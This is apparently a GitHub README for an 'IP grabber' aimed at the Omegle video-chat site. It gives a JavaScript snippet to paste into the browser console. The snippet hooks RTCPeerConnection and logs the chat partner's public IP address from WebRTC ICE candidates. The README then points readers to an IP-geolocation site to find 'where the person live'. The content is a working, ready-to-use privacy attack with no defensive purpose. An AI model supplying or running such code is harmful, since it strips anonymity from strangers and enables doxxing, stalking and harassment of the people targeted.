# iP Grabber For Omegle!

<p><center>On the bottom of the README.md file is there a script that you can use for omegle!</center></p>

# Install process
<ul>
    <li>
    <p>First go to https://omegle.com</p>
    <p>Then inspect the site (ctrl + shift + i)</p>
    <p>Then press "Console"</p>
    <p>Then paste this script:</p>
    
    window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection

    window.RTCPeerConnection = function(...args) {
     const pc = new window.oRTCPeerConnection(...args)

    pc.oaddIceCandidate = pc.addIceCandidate

    pc.addIceCandidate = function(iceCandidate, ...rest) {
     const fields = iceCandidate.candidate.split(' ')

    if (fields[7] === 'srflx') {
    console.log('IP Address:', fields[4])
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest)

    }

    return pc
    }
<p>
    If you did that press "Enter"
    Then <b>DON'T</b> close the inspect element. Just go into a chat and you see the IP
    If you want to know where the person live go to this site: https://dnschecker.org/ip-location.php?ip and paste his ip there!</p>
    </li>
    </ul>

# Special Thanks:
   <a href="https://github.com/getgaming">GitHub</a><br>
   <a href="https://youtube.com/getgamingyt">Youtube</a><br>
   <a href="https://getgaming.ml">Website</a>
